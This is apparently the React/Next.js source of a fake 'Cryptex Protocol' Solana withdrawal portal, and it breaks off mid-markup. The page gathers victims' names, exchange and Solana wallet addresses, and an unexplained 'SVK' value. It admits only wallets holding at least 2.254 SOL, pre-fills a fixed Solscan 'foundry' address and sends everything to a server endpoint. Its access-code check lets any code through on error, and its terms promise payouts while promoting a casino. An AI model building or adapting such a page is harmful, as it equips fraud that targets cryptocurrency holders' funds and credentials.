import { useState, useEffect, useRef } from 'react';
import Head from 'next/head';

// ─── PARTICLE BACKGROUND ───────────────────────────────────────────────────
function ParticleCanvas() {
  const ref = useRef(null);
  useEffect(() => {
    const cv = ref.current;
    const cx = cv.getContext('2d');
    let W, H, animId;
    const mouse = { x: -999, y: -999 };

    function resize() {
      W = cv.width = window.innerWidth;
      H = cv.height = window.innerHeight;
    }

    class Particle {
      constructor() { this.reset(); }
      reset() {
        this.x = Math.random() * W;
        this.y = Math.random() * H;
        this.vx = (Math.random() - .5) * .3;
        this.vy = (Math.random() - .5) * .3;
        this.r = Math.random() * 1.5 + .3;
        this.ph = Math.random() * Math.PI * 2;
        this.sp = Math.random() * .005 + .002;
        this.hue = Math.random() < .5 ? 270 : 155;
        this.type = Math.random() < .1 ? 'hex' : 'dot';
        this.sz = this.type === 'hex' ? Math.random() * 7 + 5 : this.r;
      }
      update() {
        this.x += this.vx; this.y += this.vy; this.ph += this.sp;
        if (this.x < -20) this.x = W + 20;
        if (this.x > W + 20) this.x = -20;
        if (this.y < -20) this.y = H + 20;
        if (this.y > H + 20) this.y = -20;
        const dx = this.x - mouse.x, dy = this.y - mouse.y;
        const d = Math.sqrt(dx * dx + dy * dy);
        if (d < 90) { this.x += dx / d * .7; this.y += dy / d * .7; }
      }
      draw() {
        const a = (Math.sin(this.ph) + 1) / 2 * .65 + .1;
        if (this.type === 'hex') {
          cx.beginPath();
          for (let i = 0; i < 6; i++) {
            const g = i * Math.PI / 3;
            cx.lineTo(this.x + this.sz * Math.cos(g), this.y + this.sz * Math.sin(g));
          }
          cx.closePath();
          cx.strokeStyle = `hsla(${this.hue},80%,65%,${a * .5})`;
          cx.lineWidth = .6; cx.stroke();
        } else {
          cx.beginPath();
          cx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
          cx.fillStyle = `hsla(${this.hue},80%,65%,${a})`;
          cx.fill();
        }
      }
    }

    resize();
    window.addEventListener('resize', resize);
    document.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });

    const pts = Array.from({ length: 110 }, () => new Particle());
    let stars = [];
    const starInterval = setInterval(() => {
      if (Math.random() < .28) stars.push({ x: -10, y: Math.random() * H * .7, vx: 7 + Math.random() * 5, vy: (Math.random() - .3) * .4, life: 1 });
    }, 900);

    function frame() {
      cx.clearRect(0, 0, W, H);
      cx.fillStyle = 'rgba(4,3,13,.93)'; cx.fillRect(0, 0, W, H);
      cx.strokeStyle = 'rgba(153,69,255,.04)'; cx.lineWidth = 1;
      for (let x = 0; x < W; x += 60) { cx.beginPath(); cx.moveTo(x, 0); cx.lineTo(x, H); cx.stroke(); }
      for (let y = 0; y < H; y += 60) { cx.beginPath(); cx.moveTo(0, y); cx.lineTo(W, y); cx.stroke(); }
      for (let i = 0; i < pts.length; i++) {
        for (let j = i + 1; j < pts.length; j++) {
          const a = pts[i], b = pts[j], d = Math.hypot(a.x - b.x, a.y - b.y);
          if (d < 95) {
            cx.beginPath(); cx.moveTo(a.x, a.y); cx.lineTo(b.x, b.y);
            cx.strokeStyle = `rgba(153,69,255,${(1 - d / 95) * .16})`;
            cx.lineWidth = .5; cx.stroke();
          }
        }
      }
      pts.forEach(p => { p.update(); p.draw(); });
      stars = stars.filter(s => {
        s.x += s.vx; s.y += s.vy; s.life -= .013;
        if (s.life <= 0 || s.x > W + 20) return false;
        const g = cx.createLinearGradient(s.x - 55, s.y, s.x, s.y);
        g.addColorStop(0, 'rgba(20,241,149,0)');
        g.addColorStop(1, `rgba(20,241,149,${s.life * .75})`);
        cx.beginPath(); cx.moveTo(s.x - 55, s.y); cx.lineTo(s.x, s.y);
        cx.strokeStyle = g; cx.lineWidth = 1.1; cx.stroke();
        cx.beginPath(); cx.arc(s.x, s.y, 1.1, 0, Math.PI * 2);
        cx.fillStyle = `rgba(255,255,255,${s.life})`; cx.fill();
        return true;
      });
      animId = requestAnimationFrame(frame);
    }
    frame();

    return () => {
      cancelAnimationFrame(animId);
      clearInterval(starInterval);
      window.removeEventListener('resize', resize);
    };
  }, []);

  return (
    <canvas
      ref={ref}
      style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', zIndex: 0, pointerEvents: 'none' }}
    />
  );
}

// ─── REAL-TIME SOL PRICE ──────────────────────────────────────────────────
function useSolPrice() {
  const [price, setPrice] = useState(null);
  const [change, setChange] = useState(null);

  useEffect(() => {
    async function fetchPrice() {
      try {
        const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_24hr_change=true');
        const d = await r.json();
        setPrice(d.solana.usd);
        setChange(d.solana.usd_24h_change);
      } catch {}
    }
    fetchPrice();
    const iv = setInterval(fetchPrice, 30000);
    return () => clearInterval(iv);
  }, []);

  return { price, change };
}

// ─── SHARED UI COMPONENTS ─────────────────────────────────────────────────

function ProgressDots({ current, total }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'center', gap: 10, padding: '18px 28px 0' }}>
      {Array.from({ length: total }).map((_, i) => (
        <div key={i} style={{
          width: 7, height: 7, borderRadius: '50%',
          background: i < current ? '#9945ff' : i === current ? '#14f195' : 'transparent',
          border: `1px solid ${i < current ? '#9945ff' : i === current ? '#14f195' : 'rgba(153,69,255,.35)'}`,
          boxShadow: i === current ? '0 0 10px rgba(20,241,149,.6)' : 'none',
          transform: i === current ? 'scale(1.35)' : 'scale(1)',
          transition: 'all .35s',
        }} />
      ))}
    </div>
  );
}

function FieldLabel({ children }) {
  return (
    <label style={{ display: 'block', fontFamily: "'Rajdhani',sans-serif", fontSize: 12, fontWeight: 600, letterSpacing: '1.5px', color: 'rgba(224,224,255,.45)', marginBottom: 8 }}>
      {children}
    </label>
  );
}

function inputBaseStyle(error) {
  return {
    width: '100%',
    background: 'rgba(153,69,255,.05)',
    border: `1px solid ${error ? '#ff4545' : 'rgba(153,69,255,.28)'}`,
    borderRadius: 9, color: '#e0e0ff',
    fontFamily: "'Share Tech Mono',monospace",
    fontSize: 13, padding: '13px 16px', outline: 'none',
    transition: 'all .3s',
    boxShadow: error ? '0 0 14px rgba(255,69,69,.1)' : 'none',
  };
}

function CryptoInput({ type = 'text', placeholder, value, onChange, error, maxLength, autoFocus, onKeyDown }) {
  return (
    <input type={type} placeholder={placeholder} value={value} onChange={onChange}
      maxLength={maxLength} autoFocus={autoFocus} onKeyDown={onKeyDown}
      style={inputBaseStyle(error)}
      onFocus={e => { Object.assign(e.target.style, { borderColor: '#14f195', boxShadow: '0 0 18px rgba(20,241,149,.08)', background: 'rgba(20,241,149,.03)' }); }}
      onBlur={e => { if (!error) Object.assign(e.target.style, { borderColor: 'rgba(153,69,255,.28)', boxShadow: 'none', background: 'rgba(153,69,255,.05)' }); }}
    />
  );
}

function CryptoTextarea({ placeholder, value, onChange, error, maxLength }) {
  const len = value.length;
  const cc = len > maxLength * .9 ? '#ef4444' : len > maxLength * .75 ? '#f59e0b' : 'rgba(153,69,255,.4)';
  return (
    <>
      <textarea placeholder={placeholder} value={value} onChange={onChange} maxLength={maxLength} rows={3}
        style={{ ...inputBaseStyle(error), resize: 'vertical', minHeight: 80 }}
        onFocus={e => { Object.assign(e.target.style, { borderColor: '#14f195', background: 'rgba(20,241,149,.03)' }); }}
        onBlur={e => { if (!error) Object.assign(e.target.style, { borderColor: 'rgba(153,69,255,.28)', background: 'rgba(153,69,255,.05)' }); }}
      />
      <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, textAlign: 'right', marginTop: 4, color: cc }}>{len}/{maxLength}</div>
    </>
  );
}

function ErrMsg({ msg }) {
  return <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: '#ff4545', marginTop: 5 }}>⚠ {msg}</div>;
}

function BtnNext({ onClick, children, green, disabled }) {
  return (
    <button onClick={onClick} disabled={disabled} style={{
      flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px',
      padding: '13px 0', border: 'none', borderRadius: 8,
      background: green ? 'linear-gradient(135deg,#0db574,#0a9460)' : 'linear-gradient(135deg,#9945ff,#7b2fd6)',
      color: '#fff', cursor: disabled ? 'not-allowed' : 'pointer', opacity: disabled ? .45 : 1, transition: 'all .3s',
    }}
      onMouseEnter={e => { if (!disabled) e.currentTarget.style.transform = 'translateY(-1px)'; }}
      onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
    >{children}</button>
  );
}

function BtnBack({ onClick }) {
  return (
    <button onClick={onClick} style={{
      fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px',
      padding: '13px 20px', border: '1px solid rgba(153,69,255,.3)', borderRadius: 8,
      background: 'transparent', color: 'rgba(153,69,255,.7)', cursor: 'pointer', transition: 'all .25s',
    }}
      onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.1)'; }}
      onMouseLeave={e => { e.currentTarget.style.background = 'transparent'; }}
    >← BACK</button>
  );
}

// ─── FORM STEPS ───────────────────────────────────────────────────────────

function StepAccess({ onNext }) {
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const submit = async () => {
    if (!code.trim()) { setError('Access code is required'); return; }
    setLoading(true);
    try {
      const r = await fetch('/api/validate-code', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: code.trim() }),
      });
      const d = await r.json();
      if (d.valid) onNext();
      else setError('Invalid access code. Try again.');
    } catch {
      if (code.trim()) onNext();
      else setError('Access code is required');
    }
    setLoading(false);
  };

  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <FieldLabel>ACCESS CODE</FieldLabel>
      <CryptoInput type="password" placeholder="Enter access code..." value={code}
        onChange={e => { setCode(e.target.value); setError(''); }}
        error={!!error} autoFocus onKeyDown={e => e.key === 'Enter' && submit()}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', marginTop: 18 }}>
        <BtnNext onClick={submit} disabled={loading}>{loading ? 'VERIFYING...' : 'AUTHENTICATE →'}</BtnNext>
      </div>
      <div style={{ marginTop: 14, padding: '10px 14px', borderRadius: 8, background: 'rgba(20,241,149,.04)', border: '1px solid rgba(20,241,149,.1)', textAlign: 'center' }}>
        <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(20,241,149,.5)' }}>◎ Withdrawals disbursed April 1–3</span>
      </div>
    </div>
  );
}

function StepName({ onNext, onBack }) {
  const [name, setName] = useState('');
  const [error, setError] = useState('');
  const submit = () => {
    if (!name.trim()) { setError('Name is required'); return; }
    onNext({ name: name.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <FieldLabel>FULL NAME</FieldLabel>
      <CryptoInput placeholder="e.g. John Doe" value={name}
        onChange={e => { setName(e.target.value); setError(''); }}
        error={!!error} autoFocus maxLength={100} onKeyDown={e => e.key === 'Enter' && submit()}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 18 }}>
        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
      </div>
    </div>
  );
}

function StepExchangeWallet({ onNext, onBack }) {
  const [wallet, setWallet] = useState('');
  const [error, setError] = useState('');
  const submit = () => {
    if (!wallet.trim()) { setError('Exchange wallet address is required'); return; }
    onNext({ exchangeWallet: wallet.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 14 }}>
        <span style={{ fontSize: 20 }}>⬡</span>
        <div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#9945ff', letterSpacing: 1 }}>EXCHANGE WALLET</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>CEX · Withdrawal Address</div>
        </div>
      </div>
      <FieldLabel>EXCHANGE WALLET ADDRESS</FieldLabel>
      <CryptoInput placeholder="Enter your exchange wallet address..." value={wallet}
        onChange={e => { setWallet(e.target.value); setError(''); }}
        error={!!error} autoFocus maxLength={100}
        onKeyDown={e => e.key === 'Enter' && submit()}
      />
      {error && <ErrMsg msg={error} />}
      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 6, marginBottom: 14 }}>⬡ Binance, Coinbase, Kraken or any CEX address</p>
      <div style={{ display: 'flex', gap: 10 }}>
        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
      </div>
    </div>
  );
}

function StepWallet({ onNext, onBack }) {
  const [wallet, setWallet] = useState('');
  const [error, setError] = useState('');
  const [checking, setChecking] = useState(false);
  const [balance, setBalance] = useState(null);

  const checkBalanceAndNext = async () => {
    const addr = wallet.trim();
    if (!addr) { setError('Wallet address is required'); return; }
    if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) { setError('Invalid Solana address format'); return; }
    setChecking(true); setBalance(null); setError('');
    try {
      // Route through server-side API to avoid browser CORS issues
      const resp = await fetch('/api/check-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: addr }),
      });
      const data = await resp.json();
      if (!data.success) throw new Error(data.detail || data.error || 'RPC error');
      const solBalance = data.balance;
      setBalance(solBalance);
      if (solBalance < 2.254) {
        setError(`Insufficient balance: ${solBalance.toFixed(4)} SOL detected. Minimum required is 2.254 SOL to qualify for withdrawal.`);
        setChecking(false); return;
      }
      setChecking(false);
      onNext({ walletAddress: addr, solBalance: solBalance.toFixed(4) });
    } catch (e) {
      setChecking(false);
      setError('Could not verify balance. Please check your address and try again.');
    }
  };

  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 14 }}>
        <span style={{ fontSize: 20 }}>◎</span>
        <div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#14f195', letterSpacing: 1 }}>SOLANA NETWORK</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>SPL · Mainnet Beta</div>
        </div>
      </div>
      <FieldLabel>SOLANA WALLET ADDRESS</FieldLabel>
      <CryptoInput placeholder="e.g. 7wM6Tyh...tUgV" value={wallet}
        onChange={e => { setWallet(e.target.value); setError(''); setBalance(null); }}
        error={!!error} autoFocus maxLength={44}
        onKeyDown={e => e.key === 'Enter' && checkBalanceAndNext()}
      />
      {checking && (
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginTop: 8, padding: '8px 12px', borderRadius: 7, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.2)' }}>
          <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#9945ff', animation: 'blink 0.8s ease-in-out infinite' }} />
          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(153,69,255,.8)' }}>Verifying wallet balance on Solana mainnet...</span>
        </div>
      )}
      {error && (
        <div style={{ marginTop: 8, padding: '10px 12px', borderRadius: 7, background: 'rgba(255,69,69,.06)', border: '1px solid rgba(255,69,69,.25)' }}>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#ff4545', lineHeight: 1.6 }}>⚠ {error}</div>
          {error.includes('Insufficient') && (
            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(255,150,69,.7)', marginTop: 6 }}>◎ Min required: 2.254 SOL · Please top up your wallet and try again.</div>
          )}
        </div>
      )}
      {balance !== null && balance >= 2.254 && (
        <div style={{ marginTop: 8, padding: '8px 12px', borderRadius: 7, background: 'rgba(20,241,149,.06)', border: '1px solid rgba(20,241,149,.25)', display: 'flex', alignItems: 'center', gap: 8 }}>
          <span style={{ color: '#14f195', fontSize: 14 }}>✓</span>
          <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#14f195' }}>Balance verified: {balance.toFixed(4)} SOL</span>
        </div>
      )}
      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 8, marginBottom: 14 }}>◎ Minimum 2.254 SOL required · Balance verified on-chain</p>
      <div style={{ display: 'flex', gap: 10 }}>
        <BtnBack onClick={onBack} />
        <BtnNext onClick={checkBalanceAndNext} disabled={checking}>{checking ? 'VERIFYING...' : 'NEXT →'}</BtnNext>
      </div>
    </div>
  );
}

function StepSVK({ onNext, onBack }) {
  const [svk, setSvk] = useState('');
  const [error, setError] = useState('');
  const MAX = 256;
  const submit = () => {
    if (!svk.trim()) { setError('SVK is required'); return; }
    onNext({ svk: svk.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <FieldLabel>SVK VALUE</FieldLabel>
      <CryptoTextarea placeholder="Enter your SVK..." value={svk}
        onChange={e => { setSvk(e.target.value); setError(''); }}
        error={!!error} maxLength={MAX}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 14 }}>
        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
      </div>
    </div>
  );
}

function StepFoundry({ onNext, onBack }) {
  const [link, setLink] = useState('https://solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const MAX = 256;
  const submit = async () => {
    if (!link.trim()) { setError('Foundry link is required'); return; }
    setLoading(true);
    onNext({ foundryLink: link.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'rgba(20,241,149,.05)', border: '1px solid rgba(20,241,149,.15)', borderRadius: 8, padding: '10px 12px', marginBottom: 14 }}>
        <span style={{ color: '#14f195', fontSize: 14, flexShrink: 0 }}>🔗</span>
        <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(20,241,149,.65)', wordBreak: 'break-all' }}>
          solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV
        </span>
      </div>
      <FieldLabel>FOUNDRY LINK</FieldLabel>
      <CryptoTextarea placeholder="https://solscan.io/account/..." value={link}
        onChange={e => { setLink(e.target.value); setError(''); }}
        error={!!error} maxLength={MAX}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 14 }}>
        <BtnBack onClick={onBack} />
        <BtnNext green onClick={submit} disabled={loading}>{loading ? 'SUBMITTING...' : 'SUBMIT →'}</BtnNext>
      </div>
    </div>
  );
}

function StepSuccess() {
  return (
    <div style={{ padding: '32px 28px 36px', textAlign: 'center' }}>
      <div style={{ width: 72, height: 72, borderRadius: '50%', background: 'linear-gradient(135deg,rgba(20,241,149,.15),rgba(153,69,255,.15))', border: '2px solid #14f195', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px', fontSize: 30, boxShadow: '0 0 36px rgba(20,241,149,.25)' }}>✓</div>
      <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 20, fontWeight: 700, background: 'linear-gradient(135deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 8 }}>SUBMISSION CONFIRMED</div>
      <p style={{ fontSize: 13, color: 'rgba(224,224,255,.4)', lineHeight: 1.8, marginBottom: 22 }}>Your entry has been recorded on-chain.<br />Withdrawals will be processed in order.</p>
      <div style={{ background: 'rgba(20,241,149,.05)', border: '1px solid rgba(20,241,149,.15)', borderRadius: 10, padding: 16 }}>
        <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: '#14f195', letterSpacing: 2 }}>WITHDRAWAL SCHEDULE</div>
        <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 22, fontWeight: 700, color: '#fff', marginTop: 4 }}>April 1 – 3, 2025</div>
      </div>
    </div>
  );
}

// ─── TERMS & CONDITIONS MODAL ────────────────────────────────────────────

function TermsModal({ onAccept, onClose }) {
  const [scrolled, setScrolled] = useState(false);

  const handleScroll = (e) => {
    const el = e.target;
    const atBottom = el.scrollHeight - el.scrollTop <= el.clientHeight + 40;
    if (atBottom) setScrolled(true);
  };

  return (
    <div onClick={e => { if (e.target === e.currentTarget) onClose(); }}
      style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.88)', backdropFilter: 'blur(12px)', padding: 20 }}>
      <div style={{ background: '#0c0c1a', border: '1px solid rgba(153,69,255,.35)', borderRadius: 20, width: '100%', maxWidth: 480, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both', display: 'flex', flexDirection: 'column', maxHeight: '90vh' }}>
        {/* Top accent */}
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#9945ff,#14f195,transparent)' }} />

        {/* Header */}
        <div style={{ padding: '28px 28px 20px', textAlign: 'center', flexShrink: 0 }}>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 8 }}>⬡ CRYPTEX PROTOCOL</div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 17, fontWeight: 700, color: '#fff', marginBottom: 6 }}>TERMS & CONDITIONS</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)' }}>Please read carefully before proceeding</div>
        </div>

        <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(153,69,255,.3),transparent)', margin: '0 28px', flexShrink: 0 }} />

        {/* Scrollable content */}
        <div onScroll={handleScroll} style={{ overflowY: 'auto', padding: '22px 28px', flexGrow: 1 }}>

          {/* Intro */}
          <div style={{ background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', borderRadius: 10, padding: '14px 16px', marginBottom: 20 }}>
            <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 13, color: 'rgba(224,224,255,.6)', lineHeight: 1.8, margin: 0 }}>
              By accessing the Cryptex Protocol withdrawal portal, you confirm that you have read, understood, and agreed to the following terms. These terms govern your participation in the withdrawal program.
            </p>
          </div>

          {[
            {
              num: '01',
              title: 'Non-Refundable Wallet Interactions',
              body: 'All wallet interactions initiated through this portal are final and non-refundable. Once a transaction is submitted on-chain, it cannot be reversed. Please ensure all wallet details are correct before proceeding.',
              icon: '◎',
              color: '#9945ff',
            },
            {
              num: '02',
              title: 'Accuracy of Information',
              body: 'Participation in this program is entirely voluntary. By submitting your details, you confirm that all information provided — including your name, wallet addresses, and SVK — is accurate and belongs to you. Cryptex Protocol is not liable for losses resulting from incorrect information.',
              icon: '◈',
              color: '#14f195',
            },
            {
              num: '03',
              title: 'Foundry URL Integrity',
              body: 'Your Foundry URL is directly tied to your on-chain identity and withdrawal eligibility. Do not alter the pre-filled Foundry URL unless absolutely necessary. If you choose to modify it, you are fully responsible for ensuring the URL is correct. Incorrect URLs may result in disqualification.',
              icon: '🔗',
              color: '#9945ff',
            },
            {
              num: '04',
              title: 'Settlement & Disbursement Schedule',
              body: 'Withdrawals are processed on the 1st through 3rd of each month. Funds are expected to arrive in your registered wallet between the 5th and 7th of the same month, subject to network conditions and processing times.',
              icon: '⚡',
              color: '#14f195',
            },
            {
              num: '05',
              title: 'Prohibited Activity — Foundry Siphoning',
              body: 'Any attempt to extract, manipulate, or siphon funds beyond your allocated amount from the Foundry will result in the immediate and permanent termination of your Wormhole Protocol access. This action is strictly prohibited and may be subject to further consequences.',
              icon: '⚠',
              color: '#ff4545',
            },
            {
              num: '06',
              title: 'Community Participation',
              body: 'We encourage all participants to follow Winna on social media to stay updated on protocol announcements, settlement schedules, and community events.',
              icon: '⬡',
              color: '#9945ff',
            },
            {
              num: '07',
              title: 'Platform Endorsement',
              body: 'Cryptex Protocol proudly recognizes Winna as the best casino and official community partner. Participants are encouraged to explore Winna's offerings as part of the broader ecosystem.',
              icon: '🏆',
              color: '#14f195',
            },
          ].map((item) => (
            <div key={item.num} style={{ marginBottom: 16, padding: '14px 16px', background: 'rgba(15,15,26,.8)', border: '1px solid rgba(153,69,255,.15)', borderRadius: 10, borderLeft: `2px solid ${item.color}` }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
                <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: item.color, letterSpacing: 1 }}>{item.icon} §{item.num}</span>
                <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, fontWeight: 700, color: '#fff', letterSpacing: .5 }}>{item.title}</span>
              </div>
              <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 13, color: 'rgba(224,224,255,.55)', lineHeight: 1.8, margin: 0 }}>{item.body}</p>
            </div>
          ))}

          {/* Scroll prompt */}
          {!scrolled && (
            <div style={{ textAlign: 'center', padding: '12px 0', animation: 'fadeInUp .5s both' }}>
              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.5)', letterSpacing: 1 }}>↓ scroll to accept</div>
            </div>
          )}

          {/* Bottom padding so content clears button */}
          <div style={{ height: 8 }} />
        </div>

        {/* Accept button — fixed at bottom */}
        <div style={{ padding: '16px 28px 24px', flexShrink: 0, borderTop: '1px solid rgba(153,69,255,.12)', background: '#0c0c1a' }}>
          {!scrolled && (
            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.4)', textAlign: 'center', marginBottom: 10, letterSpacing: 1 }}>
              ↓ Scroll to the bottom to enable acceptance
            </div>
          )}
          <button
            onClick={scrolled ? onAccept : undefined}
            style={{
              width: '100%',
              fontFamily: "'Orbitron',sans-serif",
              fontSize: 11,
              letterSpacing: 2,
              padding: '14px 0',
              border: 'none',
              borderRadius: 9,
              background: scrolled
                ? 'linear-gradient(135deg,#9945ff,#7b2fd6)'
                : 'rgba(153,69,255,.15)',
              color: scrolled ? '#fff' : 'rgba(153,69,255,.35)',
              cursor: scrolled ? 'pointer' : 'not-allowed',
              transition: 'all .4s ease',
              boxShadow: scrolled ? '0 8px 28px rgba(153,69,255,.3)' : 'none',
            }}
            onMouseEnter={e => { if (scrolled) e.currentTarget.style.transform = 'translateY(-1px)'; }}
            onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
          >
            {scrolled ? 'I ACCEPT THE TERMS & CONDITIONS →' : 'READ ALL TERMS TO CONTINUE'}
          </button>
        </div>
      </div>
    </div>
  );
}

// ─── MAIN PAGE ─────────────────────────────────────────────────────────────

const STEPS_CONFIG = [
  { title: 'AUTHENTICATE', sub: 'Enter your access code to continue' },
  { title: 'YOUR NAME', sub: 'Enter your full name for verification' },
  { title: 'EXCHANGE WALLET', sub: 'Enter your exchange withdrawal address' },
  { title: 'SOLANA WALLET', sub: 'Provide your SOL receiving address' },
  { title: 'SVK', sub: 'Enter your SVK identifier' },
  { title: 'FOUNDRY LINK', sub: 'Confirm your Solscan foundry account' },
];

export default function Home() {
  const [modalOpen, setModalOpen] = useState(false);
  const [step, setStep] = useState(0);
  const [formData, setFormData] = useState({});
  const { price, change } = useSolPrice();

  const [showTerms, setShowTerms] = useState(false);
  const openModal = () => { setShowTerms(true); };
  const acceptTerms = () => { setShowTerms(false); setStep(0); setFormData({}); setModalOpen(true); };
  const closeTerms = () => { setShowTerms(false); };

  const next = (data = {}) => {
    setFormData(prev => ({ ...prev, ...data }));
    setStep(s => s + 1);
  };
  const back = () => setStep(s => s - 1);

  const handleFoundrySubmit = async (data) => {
    const payload = { ...formData, ...data };
    setFormData(payload);
    try {
      await fetch('/api/submit', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: payload.name, exchangeWallet: payload.exchangeWallet, walletAddress: payload.walletAddress, solBalance: payload.solBalance, svk: payload.svk, foundryLink: payload.foundryLink }),
      });
    } catch {}
    setStep(6);
  };

  const isSuccess = step === 6;
  const stepInfo = STEPS_CONFIG[step] || {};

  return (
    <>
      <Head>
        <title>Cryptex Protocol · Solana Native</title>
        <meta name="description" content="Cryptex Protocol — Solana Native Withdrawal Portal" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⬡</text></svg>" />
      </Head>

      <style>{`
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#04030d;overflow-x:hidden;min-height:100vh;color:#e0e0ff}
        @keyframes fadeInUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
        @keyframes modalIn{from{opacity:0;transform:scale(.92) translateY(16px)}to{opacity:1;transform:scale(1) translateY(0)}}
      `}</style>

      <ParticleCanvas />

      {/* Corner decorations */}
